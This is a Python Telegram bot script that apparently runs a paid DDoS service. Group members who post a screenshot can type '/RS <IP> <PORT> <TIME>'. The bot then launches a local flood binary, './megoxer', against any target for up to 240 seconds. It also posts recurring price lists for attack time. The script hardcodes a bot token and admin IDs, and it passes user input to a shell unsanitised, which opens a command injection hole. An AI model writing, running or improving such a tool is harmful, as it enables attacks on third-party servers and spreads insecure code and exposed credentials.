#!/usr/bin/python3
import telebot
import time
import datetime
import subprocess
import threading
import pytz
import os

# ✅ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('8111473127:AAERRgnT8TW3fAw_cf_E2FM5zD8j4ae10k8')

# ✅ GROUP AND ADMIN DETAILS
GROUP_ID = "-1002369239894"
ADMINS = ["7129010361"]
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"

# ✅ Timezone सेट (IST)
IST = pytz.timezone('Asia/Kolkata')

# ✅ Active Attacks को Track करने वाला Dictionary  
active_attacks = {}

# AUTO ANNOUNCEMENT SYSTEM
def auto_announcement():
    while True:
        time.sleep(7200)  # 2 HOURS
        bot.send_message(GROUP_ID, """📢 **GRP UPDATE:** PAID BOT AVAILABLE 👇
    
⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡  
CHIPSET PRIZE  
1 HOURS -💸15  
1 DAYS  - 💸60  
2 DAYS  - 💸100  
5 DAYS  - 💸240  
7 DAYS  - 💸330  

PAID GROUP LINK  
👇👇👇  
https://t.me/ONLYPAID_USER_77  

BUY KARNE KE LIYE  
DM - @R_SDanger  

💸💸💸💸💸💸💸  
⚡⚡⚡⚡⚡⚡⚡  
🔥🔥🔥🔥🔥🔥 ! 🚀
""")


# ✅ /START Command (Welcome)
@bot.message_handler(commands=['start'])
def start_command(message):
    user = message.from_user
    first_name = user.first_name if user.first_name else "User"
    bot.send_message(message.chat.id, f"👋 **WELCOME, {first_name}!**\nतुम्हारा अटैक तभी लगेगा जब तुम स्क्रीनशॉट दोगे!", parse_mode="Markdown")

# ✅ FIXED: SCREENSHOT SYSTEM (अब Screenshot देना ज़रूरी है)
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id
    file_id = message.photo[-1].file_id

    caption_text = f"📸 **USER SCREENSHOT RECEIVED!**\n👤 **User ID:** `{user_id}`\n✅ **Forwarded to Admins!**"
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")
    
    bot.reply_to(message, "✅ SCREENSHOT FORWARDED! अब तुम अटैक कर सकते हो!")

    # ✅ स्क्रीनशॉट देने वाले यूज़र को अटैक करने की इजाजत दो
    active_attacks[user_id] = []

# ✅ /RS Attack Command (अब एक समय में सिर्फ 1 अटैक)
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    chat_id = str(message.chat.id)

    if chat_id != GROUP_ID:
        bot.reply_to(message, "❌ YOU CAN USE THIS COMMAND ONLY IN THE ATTACK GROUP!")
        return

    if user_id not in active_attacks:
        bot.reply_to(message, "❌ SCREENSHOT BHEJ BSDK, TABHI ATTACK LAGEGA!")
        return

    if len(active_attacks[user_id]) >= 1:
        bot.reply_to(message, "❌ MAXIMUM 1 ATTACK ALLOWED AT A TIME! पहले अटैक खत्म होने दो।")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠ USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT AND TIME MUST BE NUMBERS!")
        return

    if time_duration > 240:
        bot.reply_to(message, "🚫 MAX ATTACK TIME IS 240 SECONDS!")
        return

    end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id].append((target, port, end_time))

    bot.reply_to(message, f"🔥 ATTACK STARTED!\n🎯 TARGET: {target}\n🔢 PORT: {port}\n⏳ DURATION: {time_duration}s")

    def attack_execution():
        try:
            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.TimeoutExpired:
            bot.reply_to(message, "❌ ATTACK TIMEOUT!")
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ ATTACK FAILED!")

        # ✅ अटैक खत्म होते ही लिस्ट से हटा दो
        active_attacks[user_id] = []

    threading.Thread(target=attack_execution).start()

# ✅ /STATS Command - Shows Only Active Attacks
@bot.message_handler(commands=['check'])
def attack_stats(message):
    if not active_attacks:
        bot.reply_to(message, "📊 No Active Attacks Right Now!")
        return

    now = datetime.datetime.now(IST)
    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"

    for user_id, attacks in active_attacks.items():
        if attacks:
            stats_message += f"👤 **User ID:** `{user_id}`\n"
            for target, port, end_time in attacks:
                remaining_time = (end_time - now).total_seconds()
                stats_message += f"🚀 **Target:** `{target}`\n🎯 **Port:** `{port}`\n⏳ **Ends In:** `{int(remaining_time)}s`\n\n"

    bot.reply_to(message, stats_message, parse_mode="Markdown")

while True:
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        print(f"Polling Error: {e}")
        time.sleep(5)  # कुछ सेकंड wait करके फिर से start करेगा